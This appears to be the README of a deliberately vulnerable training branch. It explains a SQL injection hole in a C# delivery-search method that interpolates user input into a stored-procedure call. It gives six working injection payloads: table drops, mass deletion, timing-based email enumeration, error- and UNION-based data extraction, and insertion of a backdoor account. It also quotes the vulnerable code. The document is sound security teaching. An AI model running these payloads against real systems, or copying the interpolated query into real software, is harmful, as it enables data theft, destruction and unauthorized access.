# SQL Injection Vulnerability Demo

## Overview

This branch demonstrates a **SQL Injection** vulnerability in the delivery search functionality. The vulnerability exists in `DeliveryStore.SearchByCargoDescriptionSproc()` where user input is directly concatenated into a SQL command string without proper parameterization.

## What is SQL Injection?

SQL Injection is a code injection technique that exploits security vulnerabilities in an application's database layer. Attackers can insert malicious SQL statements into application input fields, which are then executed by the database. This can lead to:

- Unauthorized data access
- Data modification or deletion
- Authentication bypass
- Complete system compromise
- Remote code execution (in severe cases)

SQL Injection consistently ranks in the OWASP Top 10 Web Application Security Risks.

## The Vulnerability

### Vulnerable Code Location

`projects/api/src/MBC.Persistence/Stores/DeliveryStore.cs` - Line 151

```csharp
command.CommandText = $"EXEC SearchDeliveriesByCargoDescription '{customerId}', '{searchTerm ?? string.Empty}', {skip}, {take}";
```

The `searchTerm` parameter is directly interpolated into the SQL command string without sanitization or parameterization, allowing attackers to inject arbitrary SQL code.

### How It Works

When a user searches for deliveries by cargo description, the search term is concatenated directly into the SQL command. An attacker can close the string literal and inject their own SQL commands.

**Normal query:**

```sql
EXEC SearchDeliveriesByCargoDescription '123e4567-e89b-12d3-a456-426614174000', 'electronics', 0, 20
```

**Injected query:**

```sql
EXEC SearchDeliveriesByCargoDescription '123e4567-e89b-12d3-a456-426614174000', 'x'; DROP TABLE Deliveries; --', 0, 20
```

## Attack Samples

### 1. Table Destruction (Requires DDL Permissions)

**Attack String:**

```
'; DROP TABLE Deliveries; --
```

**Resulting SQL:**

```sql
EXEC SearchDeliveriesByCargoDescription '...', ''; DROP TABLE Deliveries; --', 0, 20
```

**Impact:** Destroys the Deliveries table completely. Note: This may fail if the SQL Server account lacks DDL permissions (which is common in production).

---

### 2. Data Deletion (DML Attack)

**Attack String:**

```
'; DELETE FROM Deliveries WHERE 1=1; --
```

**Resulting SQL:**

```sql
EXEC SearchDeliveriesByCargoDescription '...', ''; DELETE FROM Deliveries WHERE 1=1; --', 0, 20
```

**Impact:** Deletes all delivery records. More likely to succeed than DDL attacks since the application typically has DML permissions.


---

### 3. Time-Based Blind SQL Injection - Email Enumeration

**Attack String (Check if admin@example.com exists):**

```
test', 0, 20; IF EXISTS(SELECT 1 FROM AspNetUsers WHERE Email='admin@example.com') WAITFOR DELAY '00:00:03'; --
```

**How it works:**
- If the email doesn't exist, the query completes quickly
- By measuring response time, an attacker can enumerate valid email addresses
- Note: the stored procedure actually runs, so no errors get logged.

**Simpler timing attack:**

```
test', 0, 20; WAITFOR DELAY '00:00:05'; --
```

**Impact:** Causes a 5-second delay, proving SQL injection exists. This is often the first step attackers take to confirm vulnerability.

---

### 4. Data Exfiltration via Error Messages

**Attack String:**

```
' AND 1=CAST((SELECT TOP 1 Email FROM AspNetUsers) AS INT); --
```

**Impact:** Forces SQL Server to convert an email string to an integer, causing an error message that contains the email address. If error messages are displayed to users, this reveals sensitive data.

---



### 5. Union-Based Data Extraction

**Attack String:**

```
' UNION SELECT Id, NULL, NULL, NULL, NULL, NULL, Email, NULL, NULL, NULL, 0, GETDATE(), GETDATE() FROM AspNetUsers; --
```

**Impact:** Appends user email addresses to the search results. Requires knowledge of column count and types, but attackers can discover this through trial and error.

---

### 6. Stacked Queries - Creating Backdoor

**Attack String:**

```
cargo', 0, 20; INSERT INTO AspNetUsers (Email, UserName, NormalizedEmail, NormalizedUserName) VALUES ('hacker@evil.com', 'hacker', 'HACKER@EVIL.COM', 'HACKER'); --
```

**Impact:** Injects a new user account for persistent access.






## Famous SQL Injection Attacks

### 1. **2008 - Heartland Payment Systems**

- **Impact:** 134 million credit card numbers stolen
- **Method:** SQL injection used to install malware
- **Cost:** Over $200 million in damages
- **Source:** [Verizon Data Breach Report](https://www.verizon.com/business/resources/reports/dbir/)

### 2. **2011 - Sony PlayStation Network**

- **Impact:** 77 million user accounts compromised, 23-day service outage
- **Method:** SQL injection to access customer database
- **Cost:** $171 million, massive reputation damage
- **Source:** [Sony Data Breach Wikipedia](https://en.wikipedia.org/wiki/2011_PlayStation_Network_outage)

### 3. **2012 - Yahoo! Voices**

- **Impact:** 450,000 passwords stolen and published
- **Method:** Union-based SQL injection
- **Source:** [BBC News Report](https://www.bbc.com/news/technology-18704025)

### 4. **2015 - TalkTalk**

- **Impact:** 157,000 customer records stolen, £400,000 fine
- **Method:** Basic SQL injection through website search
- **Source:** [UK ICO Report](https://ico.org.uk/)

### 5. **2019 - Fortnite**

- **Impact:** Potential access to 200 million accounts
- **Method:** SQL injection in web framework
- **Source:** [Security Research Disclosure](https://www.checkpoint.com/)

### 6. **2023 - MOVEit Transfer**

- **Impact:** Hundreds of organizations, millions of individuals affected
- **Method:** SQL injection leading to remote code execution
- **Source:** [Wikipedia](https://en.wikipedia.org/wiki/2023_MOVEit_data_breach)


---

## Why This Vulnerability Exists

Common developer mistakes that lead to SQL injection:

1. **Performance concerns** - Developers sometimes avoid ORMs or parameterized queries thinking they're faster
2. **Legacy code** - Older codebases written before parameterization was standard
3. **Convenience** - String concatenation feels simpler during development
4. **Lack of awareness** - Not understanding the security implications
5. **Complex queries** - Belief that stored procedures are inherently safe

## Resources and Further Reading

### Official Documentation

- [Microsoft: SQL Injection](https://learn.microsoft.com/en-us/sql/relational-databases/security/sql-injection)
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

### Educational Resources

- [Wikipedia: SQL Injection](https://en.wikipedia.org/wiki/SQL_injection)
- [PortSwigger: SQL Injection](https://portswigger.net/web-security/sql-injection)
- [Bobby Tables: A guide to preventing SQL injection](https://bobby-tables.com/)


### Testing Tools

- [sqlmap](https://sqlmap.org/) - Automated SQL injection detection and exploitation
- [Burp Suite](https://portswigger.net/burp) - Web vulnerability scanner


## License Note

This vulnerable code is for **educational purposes only**. Never deploy vulnerable code to production environments.
